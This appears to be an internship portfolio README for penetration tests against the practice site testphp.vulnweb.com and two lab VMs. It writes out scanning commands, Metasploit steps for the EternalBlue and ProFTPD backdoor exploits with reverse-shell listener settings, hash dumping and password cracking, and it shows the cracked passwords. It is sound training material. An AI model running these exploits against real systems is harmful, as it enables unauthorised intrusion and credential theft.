# CyberSec PenTest Suite: Web & Network Vulnerability Assessment

## Overview
These projects were completed as part of my internship at **Yhill Edutech Pvt. Ltd.**. The projects focus on penetration testing, vulnerability assessment, and network scanning for both web applications and virtual machines (VMs). Below are the details and findings for each project.

---

## Project 1: Web Application Penetration Testing

### Scenario:
I conducted penetration testing on **http://testphp.vulnweb.com** to identify security vulnerabilities. This high-level technical report includes proof of concept (POC) screenshots, techniques used, and the tools/frameworks utilized.

### Target Information:
- **Website**: testphp.vulnweb.com
- **IP Address**: 44.228.249.3
- **Operating System**: Likely Linux (version 2.6.32 - 5.8)
- **Open Ports**: 80 (HTTP)

### Tools and Techniques:
1. **WhatWeb Scanning**:
   - **Command**: `whatweb http://testphp.vulnweb.com`
   - **Findings**: Outdated software (Nginx 1.19.0, PHP 5.6.40), Adobe Flash vulnerability.

2. **SQL Injection Testing**:
   - **Tool**: SQLMap
   - **Command**: `sqlmap -u "http://testphp.vulnweb.com/login.php" --forms`
   - **Findings**: SQL Injection vulnerabilities in `uname` and `pass` fields.
     - Boolean-based blind, Time-based blind, and UNION query injections.

3. **Directory Enumeration**:
   - **Tool**: Gobuster
   - **Command**: `gobuster dir -u http://testphp.vulnweb.com -w /usr/share/dirb/wordlists/common.txt`
   - **Findings**: Access to sensitive directories like `/admin`, `/cgi-bin/`, and `/secured/`.
![image](https://github.com/user-attachments/assets/7004eac6-7715-4533-9139-9656be95b39f)

4. **Web Vulnerability Scanning**:
   - **Tool**: Nikto
   - **Command**: `nikto -h http://testphp.vulnweb.com`
   - **Findings**: Missing security headers (X-Frame-Options, X-Content-Type-Options), accessible files (`/clientaccesspolicy.xml`, `/crossdomain.xml`).
![image](https://github.com/user-attachments/assets/31383c81-9aaf-446c-8733-5ed72120b5bf)

### Conclusion:
The web application is vulnerable to multiple SQL injection types in the login form. The presence of outdated software and missing security headers increases the risk of unauthorized access and data breaches.

---

## Project 2: Network Penetration Testing

### Scenario:
I conducted network penetration testing on **Windows VM** and **Ubuntu VM** to identify devices and vulnerabilities. This technical documentation includes a complete report with proof of concept (POC) screenshots, testing techniques, and a non-technical summary.

### Target Information:
- **Windows VM IP**: 172.16.130.132
- **Ubuntu VM IP**: 172.16.130.133

### Tools and Techniques:
1. **Network Reconnaissance**:
   - **Tool**: ARP-Scan
   - **Command**: `arp-scan --localnet`
   - **Findings**: Discovered target IPs for Windows and Ubuntu VMs.

2. **Nmap Scanning**:
   - **Windows VM**:
     - **Command**: `nmap -sV --script vuln -oN nmap_scan_results.txt 172.16.130.132`
     - **Findings**: Vulnerable to MS17-010 SMBv1 vulnerability (Remote Code Execution, port 445).
   - **Ubuntu VM**:
     - **Command**: `sudo nmap -sS -sV -O -T4 -A 172.16.130.133`
     - **Findings**: Vulnerability in ProFTPD (port 21).

3. **Exploitation**:
   - **Windows VM**: 
     - **Tool**: Metasploit
     - **Command**:
       ```
       msfconsole
       search ms17-010
       use exploit/windows/smb/ms17_010_eternalblue
       set RHOSTS 172.16.130.132
       set RPORT 445
       set LHOST 192.168.100.191
       set LPORT 4444
       exploit
       ```
     - **Outcome**: Successfully exploited MS17-010 SMB vulnerability, accessed the system.
      ![image](https://github.com/user-attachments/assets/b04559c0-de54-4cd2-9a2e-bebfe413ef1f)
 
   - **Ubuntu VM**: 
     - **Tool**: Metasploit
     - **Command**:
       ```
       search proFTPD 1.3.3c
       use exploit/unix/ftp/proftpd_133c_backdoor
       set RHOST 172.16.130.133
       set RPORT 21
       set LHOST 192.168.100.191
       set LPORT 4443
       exploit
       ```
     - **Outcome**: Gained root access through ProFTPD backdoor.
       ![image](https://github.com/user-attachments/assets/1f2cd47f-5335-481d-ba25-fa68b8beff12)

4. **Password Cracking**:
   - **Windows VM**:
     - **Command**:
       ```
       hashdump
       john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hash.txt
       ```
     - **Outcome**: Cracked the password: `alqfna22`.
![image](https://github.com/user-attachments/assets/5bfb2898-7169-45c8-84a0-32bb3607a4a9)

   - **Ubuntu VM**:
     - **Command**:
       ```
       unshadow passwd.txt shadow.txt > pass.txt
       john pass.txt
       ```
     - **Outcome**: Cracked the password: `marlinspike`.
       ![image](https://github.com/user-attachments/assets/dc3035a6-4cee-427b-929f-0d9cad844e9b)


### Conclusion:
Both the **Windows VM** and **Ubuntu VM** contain critical vulnerabilities that allow for remote code execution and unauthorized access. Immediate patching and updating are strongly recommended.

---

## Tools Used:
- **WhatWeb**: Web server scanning and enumeration.
- **SQLMap**: Automated SQL injection detection.
- **Gobuster**: Directory brute-forcing.
- **Nikto**: Web vulnerability scanning.
- **ARP-Scan**: Network device identification.
- **Nmap**: Vulnerability scanning and service detection.
- **Metasploit**: Exploitation framework.
- **John the Ripper**: Password cracking.

---

## Acknowledgments
These projects were part of my **cybersecurity internship** at **Yhill Edutech Pvt. Ltd.**, where I gained valuable experience in penetration testing, vulnerability assessments, and reporting.

---

### Contact Information:
For more information or to discuss the projects in detail, feel free to reach out via [LinkedIn](https://www.linkedin.com/in/neeraj-kumar-2ba511286/).

---

